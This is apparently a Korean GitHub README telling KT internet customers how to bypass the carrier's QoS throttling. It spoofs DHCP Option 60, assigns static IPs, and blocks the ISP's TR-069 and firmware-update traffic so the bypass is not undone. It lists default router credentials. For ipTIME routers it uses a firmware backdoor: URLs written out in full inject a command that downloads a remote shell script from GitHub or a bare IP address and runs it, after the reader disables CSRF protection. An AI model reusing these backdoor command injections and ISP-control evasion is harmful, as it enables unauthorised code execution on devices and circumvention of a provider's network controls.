# bypassQoSKoreatelecomISP

## ROKFOSS 프로젝트에서 일부 수정하였습니다

이 글은 ROKFOSS 프로젝트에서 일부 수정한 것입니다. 원본에는 없는 부분이 있을 수 있습니다.

아래 방법은 KT 사용자들에게만 유효하며 LGU+ 및 SKB는 사용할 수 없습니다. LGU+ 경우 현재까지 알려진 방법은 없습니다. 만약 우회가 필요하다면 KT 또는 SKB(대칭형)으로 인터넷을 바꾸는 것도 방법이 될 수 있습니다.

ROKFOSS 프로젝트에서 추가한 부분에 대해서 문의가 있거나 새로운 정보가 있다면 krfoss@krfoss.org로 문의하거나 [ROKFOSS 커뮤니티](https://chat.krfoss.org)에서 사람들과 정보를 교류해보세요! 이곳에는 없는 방법들을 함께 연구할 수 있습니다.

설정이 제대로 되었는지 확인하고 싶다면 ROKFOSS 프로젝트 분산미러 웹 사이트를 [방문](https://http.krfoss.org)하여 자신의 위치 정보를 확인하세요. 위치가 한강에 빠져있다고 나온다면 설정이 올바르게 된것입니다.

> [!TIP]
> 이 글은 네트워크 장비에 관한 지식이 필요합니다. 관련한 지식이 부족하거나 없는 경우에는 구글 검색이 유용할 수도 있습니다. 또는 인공지능의 도움을 받는 것도 방법이 될 수 있지만 인공지능의 환각으로 인한 잘못된 정보를 받을 수 있습니다.

## TPLINK ROUTER

TPLINK 라우터는 2025년 5월에 있었던 최신 펌웨어를 다운 받아서 업데이트를 하면 Option 60을 사용할 수 있습니다.

ER605 기준으로 라우터 관리자 페이지에 접속한 후 로그인을 진행하세요,

이후 좌측 메뉴에서 Network 탭을 눌러 WAN으로 들어갑니다.

WAN1을 누른 뒤 Advanced Settings를 찾아주세요. 이것을 누르면 탭이 하나 열리는데, 여기서 Option 60에 아래 걊을 넣은 뒤 Save를 클릭하여 저장하세요.

```
KT_PR_HH_A_A
```

다른 Tplink 라우터 및 공유기에 대해서 성공 사례가 있다면 krfoss@krfoss.org로 알려주세요. 


## KT GiGA WiFi (통신사 Router, 기본값 설정인 KT 모드가 필요)
제한에서 벗어날 <ins>**각 기기**</ins>(이중 NAT 구성의 미지원 Router 포함)에 대해 수동IP설정 **또는** GiGA WiFi의 사용자 설정 웹 페이지에서 '수동 IP 할당 설정'(DHCP 정적 할당) 설정을 마치세요

아래 표를 확인하여 현재 사용중인 모델의 KT GiGA WiFi에서 사용 가능여부(추측 포함)를 확인하기\:

|＼|수동IP설정|수동 IP 할당 설정|업그레이드,TR069 차단|
|---------:|:--|:--|:--|
|KM06-506H, KM06-704H|？|✕|？|
|DW02-412H|？|✕|✕|
|KM08-708H, DV01-901H<br>Wave2|？|？|？|
|TI04-708H Wave2|〇|✕|✕|
|KM12-007H<br>GiGA WiFi home ax|？|？|？|
|KM17-305H<br>GiGA WiFi home ax|〇|〇|？|
|KM15-103H<br>GiGA WiFi home ax|〇|〇|〇|
|DV02-012H<br>GiGA WiFi home ax|〇|〇|✕|
|HR08-407H<br>GiGA WiFi home ax|〇|✕|〇|
|AR06-012H<br>GiGA WiFi home ax|〇|✕|✕|
|KM18-311H<br>KT WiFi 6D|？|？|？|
|KB01-411H<br>KT WiFi 7D|？|？|？|

__표에서 확인할 수 없는 모델의 각 기능 사용 가능여부를 여러분의 제보(Issues, 메일주소 3570kgen@naver.com , 기여자에 대한 기록을 남기고 싶을경우 Pull Request 등)를 통해 보충할 수 있게 해주세요!__

__사용중인 기기의 모델명, 펌웨어 버전, 수동IP설정, '수동 IP 할당 설정'의 성공 여부,__
__KT GiGA WiFi 사용자 설정 페이지 - 상태정보의 로그('Update' 또는 'Upgrade' 등의 문자열을 포함하는 로그 확인, 부팅 후 많은 시간이 지나면 다른 로그에 의해 확인할 수 없는 경우가 있음)를 확인한 후, 'Update' 또는 'Upgrade' 등의 문자열을 포함하는 로그가 아래의 4가지 규칙 추가 & 재부팅 후 2-5분 후에 기록되는 로그와 비교해 차이점이 있는지 확인하고 알려주셨으면 합니다.__

--------------------------------

ASUSWRT(아수스 공유기, 이중 NAT 구성에서 사용할 수 없음) - http://www.asusrouter.com 에서 초기 설정 시 입력한 관리자 계정과 암호를 입력 후
 1. 아래 링크의 자동 IP - c단락을 참고하거나,
 2. 아래 스크린샷을 참고하여

클래스 식별자 (Option 60)를 KT_PR_HH_A_A 로 입력 후 적용:
https://www.asus.com/kr/support/faq/1011715/
![asuswrt2a](https://github.com/user-attachments/assets/c8936908-946f-40d5-9a8e-b480b0ce658b)

--------------------------------
수동IP설정

**각 기기**는 수동IP설정 적용 후, 다른 WiFi 연결 또는 다른 공유기와 연결 시 네트워크/인터넷에 연결할 수 없는 경우가 있으며 이 때 해당 설정을 원래대로(자동/DHCP) 되돌리세요. **각 기기**마다 설정 방법이 다를 수 있습니다

Windows 11과 같이 서브넷 접두사 길이가 아닌 서브넷 마스크를 요구하는 경우 255.255.255.0을 입력하세요.

![W10manualIP_0](https://github.com/user-attachments/assets/77e57272-64f5-4cae-bf86-23bc7e9bcff2)

Windows 11에서는 UI에 차이가 있습니다\:

![w11SettingApp](https://github.com/user-attachments/assets/53cc5dc3-22ab-41e2-93dd-a4bc4c3d7fbd)

![W10manualIP_1](https://github.com/user-attachments/assets/fa07bd17-579b-467c-97c7-40bcc43d4ec2)

또는 '수동 IP 할당 설정'을 사용하기(분기 시작)

KT GiGA WiFi와 연결된 기기에서 http://172.30.1.254:8899 , 구성되지 않은 경우 ID는 ktuser , 비번은 megaap 또는 homehub 로 로그인 후 새로운 사용자 이름과 비번을 설정하여 사용자 설정 페이지에 접근할 수 있습니다\:

장치설정 - 네트워크 관리 - LAN 연결 설정

![StaticLeasePremiumIP_KTGiGAWiFi](https://github.com/user-attachments/assets/9d7bda7f-f1a5-4663-8435-f91347cf6cbf)

GiGA WiFi의 사용자 설정 페이지에서 수동IP설정 없이 '수동 IP 할당 설정'**(일부 기기만 지원)** 을 필요에 따라 완료하세요. 
__변경 사항은 다음에 유선 또는 무선으로 연결될 때 적용되므로 KT GiGA WiFi를 재시동하거나 각 기기의 네트워크 연결을 끊었다가 다시 연결해야 할 수 있습니다.__

(분기 끝)

--------------------------------

변경 사항이 적용된 후, https://icanhazip.com 와 같은 외부 서비스를 사용하여 외부 IP주소를 확인하면 기존과 다른 '프리미엄 IP'가 할당된 것을 확인할 수 있으며, 프리미엄 IP에서도 포트 포워딩을 사용할 수 있습니다.
<img width="1080" alt="GiGAWifi_premiumip" src="https://github.com/user-attachments/assets/280c972c-cc1d-4ca3-bf41-ac8a4e77b74c" />

--------------------------------

마무리로서, 해당 방법의 사용을 저지하려는 시도 중 일부를 방지하기 위해 GiGA WiFi의 자동 펌웨어 업그레이드와 TR-069 통신을 차단 **(일부 기기만 지원)** 합시다

먼저 허용 규칙부터 추가해야 GiGA WiFi에 연결된 IPTV 등의 기기에서의 오작동을 방지할 수 있습니다

4개의 규칙을 모두 추가한 후, 허용 규칙이 차단 규칙보다 밑에(머큐리) 또는 위에(H1Radio) 있으면 됩니다.

<img width="497" alt="FWUpgradeBlocking_2" src="https://github.com/user-attachments/assets/05a0f3bb-f7c1-4724-9ba3-203dc0093c36" />


--------------------------------

넷기어 (예시로서 나이트호크 RAX80) -

<img width="1424" alt="Nighthawk_RAX80" src="https://github.com/user-attachments/assets/c5c1ba09-4d63-4d28-8e2b-3f1344e36719" />

--------------------------------

시놀로지RT (예시로서 RT1900ac) - 

![RT1900ac](https://github.com/user-attachments/assets/5ea5243e-821a-42c5-a18d-e3f2dcd5319e)

--------------------------------

OpenWrt - 

https://archive.md/VRZIO

--------------------------------

iptime(알파테스트중)

백도어 출처 - https://github.com/tylzars/iptime-debug - 펌웨어 버전 15.10.0, ipTIME A2004S에서 동작 확인됨

위 출처와 같이 iptime 공유기의 '원격 지원'기능에 잠재된 백도어에 접근할 방법이 있는 경우에만 유효합니다

<a href="https://github.com/veilRedeemer/udhcp/releases">미리 빌드된 udhcpc 출처</a>

1. 적용하려는 기기는 '악성 스크립트 접근 방지(CSRF)'기능이 꺼져 있으며, '원격 지원'기능이 켜져 있어야 합니다:
<img width="285" alt="iptime1" src="https://github.com/user-attachments/assets/ef4882cc-03a4-4478-acd1-a0418048dca0" />

2. 아래 링크 중 하나를 직접 클릭하지 말고 로그인한 관리자 페이지의 주소 칸에 붙여넣어 진행하세요. 관리자 계정/비밀번호를 설정하지 않은 경우 동작하지 않습니다:

http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fstart.sh%20https%3a%2f%2fraw.githubusercontent.com%2fveilRedeemer%2fbypassQoSKoreatelecomISP%2frefs%2fheads%2fmain%2fiptime_bootstrap.sh%20%3bchmod%20755%20%2ftmp%2fstart.sh%20%3b%2ftmp%2fstart.sh

  이때 아래와 같은 메시지가 표시된다면 원본 링크의 암호화된 연결을 지원하지 않는 환경이므로 각자 웹서버를 준비하거나 아래에 미리 준비된 미러 링크를 사용해야 합니다
   
<img width="498" alt="notls" src="https://github.com/user-attachments/assets/6ee27eda-0b7f-4213-a868-7a118907b1d3" />

   미러 링크는 접속자의 IP 주소와 타임스탬프를 포함한 접속 기록을 저장함에 동의하고 미러 링크를 사용:

http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fstart.sh%20http%3a%2f%2f168.138.196.144%2fiptime_bootstrap.sh%20%3bchmod%20755%20%2ftmp%2fstart.sh%20%3b%2ftmp%2fstart.sh

3. 아래와 같이 표시되면 성공. 다운로드한 데이터를 포함한 변경 사항은 특정 공유기 설정을 변경하거나 재시동되거나 전원이 끊어지면 지워집니다:
<img width="333" alt="iptime2" src="https://github.com/user-attachments/assets/fa6ee8d4-9990-4f80-8d70-8ad551737b36" />

성공적으로 프리미엄 IP를 취득했거나 실패했다면 기기 모델명과 펌웨어 버전, 미러 다운로드 주소 사용여부, 실패 시 출력되는 메세지를 3570kgen@naver.com 에 제보하는 것을 고려해보세요.

--------------------------------
